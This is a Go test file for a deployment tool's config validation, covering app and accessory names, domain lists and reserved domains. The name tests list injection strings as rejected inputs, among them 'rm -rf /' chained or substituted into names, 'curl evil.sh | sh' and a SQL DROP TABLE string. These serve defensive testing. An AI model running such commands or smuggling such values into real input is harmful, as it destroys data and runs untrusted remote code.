package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestValidateName_RejectsShellMetacharacters guards the ad-hoc --app
// deploy path (internal/cli/deploy.go's runAdHocDeploy) and the --app flag
// shared by resolveApp (internal/cli/connect.go): both build an AppConfig
// directly and never reach AppConfig.validate(), so ValidateName is their
// only protection before the name reaches remote shell commands.
func TestValidateName_RejectsShellMetacharacters(t *testing.T) {
	payloads := []string{
		"",
		"x; rm -rf /",
		"x$(rm -rf /)",
		"x`rm -rf /`",
		"x && curl evil.sh | sh",
		"x'; DROP TABLE users; --",
		"UPPERCASE",
		"has spaces",
		"-leading-hyphen",
		"trailing-hyphen-",
	}
	for _, p := range payloads {
		if err := ValidateName(p); err == nil {
			t.Errorf("ValidateName(%q) = nil, want error", p)
		}
	}
}

func TestValidateName_AcceptsValidNames(t *testing.T) {
	valid := []string{"myapp", "my-app", "a", "app123", "app-123-x"}
	for _, v := range valid {
		if err := ValidateName(v); err != nil {
			t.Errorf("ValidateName(%q) = %v, want nil", v, err)
		}
	}
}

func TestValidateName_TooLong(t *testing.T) {
	long := ""
	for i := 0; i < 64; i++ {
		long += "a"
	}
	if err := ValidateName(long); err == nil {
		t.Error("expected error for 64-char name (max is 63)")
	}
}

// TestValidateIdentifier_UsedForAccessoryNames guards `teploy accessory
// stop/start/logs/exec <name>` (internal/cli/accessory.go), which take an
// unvalidated CLI positional arg that flows into unquoted-by-construction
// path building in internal/accessories/accessories.go.
func TestValidateIdentifier_UsedForAccessoryNames(t *testing.T) {
	if err := ValidateIdentifier("accessory", "postgres"); err != nil {
		t.Errorf("expected valid accessory name to pass, got %v", err)
	}
	if err := ValidateIdentifier("accessory", "postgres; rm -rf /"); err == nil {
		t.Error("expected shell-metacharacter accessory name to be rejected")
	}
	err := ValidateIdentifier("accessory", "")
	if err == nil {
		t.Fatal("expected error for empty accessory name")
	}
	if got, want := err.Error(), "'accessory' is required"; got != want {
		t.Errorf("error message = %q, want %q (label must be substituted, not hardcoded to 'app')", got, want)
	}
}

func TestValidateDomain(t *testing.T) {
	cases := []struct {
		domain    string
		allowZero bool
		wantErr   bool
	}{
		{"example.com", false, false},
		{"example.com, www.example.com", false, false},
		{"", false, true},              // empty rejected unless allowEmpty
		{"", true, false},              // empty accepted for ingress: host
		{"example.com, ", false, true}, // trailing empty entry rejected
		{"not a domain", false, true},
	}
	for _, c := range cases {
		err := ValidateDomain(c.domain, c.allowZero)
		if (err != nil) != c.wantErr {
			t.Errorf("ValidateDomain(%q, %v) error = %v, wantErr %v", c.domain, c.allowZero, err, c.wantErr)
		}
	}
}

func TestIsReservedDomain(t *testing.T) {
	for host, want := range map[string]bool{
		"example.com":        true,
		"dash.example.com":   true,
		"DASH.EXAMPLE.COM.":  true,
		"example.net":        true,
		"a.example.org":      true,
		"foo.example":        true,
		"example":            true,
		"app.test":           true,
		"app.invalid":        true,
		"app.localhost":      true,
		"localhost":          true,
		"*.example.com":      true,
		"example.com.au":     false,
		"notexample.com":     false,
		"my-example.org":     false,
		"contest":            false,
		"thelocalhost":       false,
		"latest.dev":         false,
		"teploy-fixture.dev": false,
	} {
		if got := IsReservedDomain(host); got != want {
			t.Errorf("IsReservedDomain(%q) = %v, want %v", host, got, want)
		}
	}
}

func TestValidateDeployDomain(t *testing.T) {
	load := func(t *testing.T, yaml string) *AppConfig {
		t.Helper()
		cfg, err := LoadAppBytes([]byte(yaml))
		if err != nil {
			t.Fatalf("a reserved name must load, for read and recovery commands: %v", err)
		}
		return cfg
	}
	refused := map[string]string{
		"caddy default":   "app: a\ndomain: a.example.com\n",
		"explicit caddy":  "app: a\ningress: caddy\ndomain: a.test\n",
		"one of several":  "app: a\ndomain: real.dev, a.invalid\n",
		"static is caddy": "app: a\ntype: static\nsource: dist\ndomain: a.example.org\n",
	}
	for name, cfg := range refused {
		t.Run(name, func(t *testing.T) {
			err := ValidateDeployDomain(load(t, cfg))
			if err == nil || !strings.Contains(err.Error(), "reserved") {
				t.Fatalf("expected the reserved-name refusal, got %v", err)
			}
		})
	}
	allowed := map[string]string{
		"tls internal":  "app: a\ndomain: a.test\ntls:\n  internal: true\n",
		"tls http only": "app: a\ndomain: a.example.com\ntls:\n  http_only: true\n",
		"custom cert":   "app: a\ndomain: app.test\ntls:\n  cert: c.pem\n  key: k.pem\n",
		"localhost":     "app: a\ndomain: localhost\n",
		"foo.localhost": "app: a\ndomain: foo.localhost\n",
		"host label":    "app: a\ningress: host\nport: 3000\ndomain: a.example.com\n",
		"external":      "app: a\ningress: external\ndomain: a.example.com\n",
		"real name":     "app: a\ndomain: a.teploy-fixture.dev\n",
	}
	for name, cfg := range allowed {
		t.Run(name, func(t *testing.T) {
			if err := ValidateDeployDomain(load(t, cfg)); err != nil {
				t.Fatalf("should be admitted: %v", err)
			}
		})
	}
	if warns := ReservedDomainLabelWarnings("a.example.com, real.dev", IngressHost); len(warns) != 1 || !strings.Contains(warns[0], "label") {
		t.Errorf("host ingress must warn label-only once: %v", warns)
	}
	if !IsReservedDomain("foo.localhost") {
		t.Error("localhost names stay reserved for DNS classification")
	}
}

// The overlay decides: a placeholder in the base file replaced by
// teploy.prod.yml loads and is admitted, and without the overlay the base still
// loads, so `teploy rollback` and logs work from that folder mid-incident.
func TestReservedDomain_OverlayDecides(t *testing.T) {
	dir := t.TempDir()
	write := func(name, content string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("teploy.yml", "app: a\ndomain: placeholder.example.com\nimage: nginx:1\n")
	write("teploy.prod.yml", "domain: real.teploy-fixture.dev\n")

	merged, err := LoadAppWithDestination(dir, "prod", OverlayOptions{})
	if err != nil {
		t.Fatalf("a placeholder an overlay replaces must load: %v", err)
	}
	if merged.Domain != "real.teploy-fixture.dev" {
		t.Fatalf("domain = %q", merged.Domain)
	}
	if err := ValidateDeployDomain(merged); err != nil {
		t.Fatalf("the merged config is admitted: %v", err)
	}

	base, err := LoadApp(dir)
	if err != nil {
		t.Fatalf("read and recovery commands must load the base: %v", err)
	}
	if err := ValidateDeployDomain(base); err == nil {
		t.Fatal("deploying the placeholder itself is still refused")
	}
}
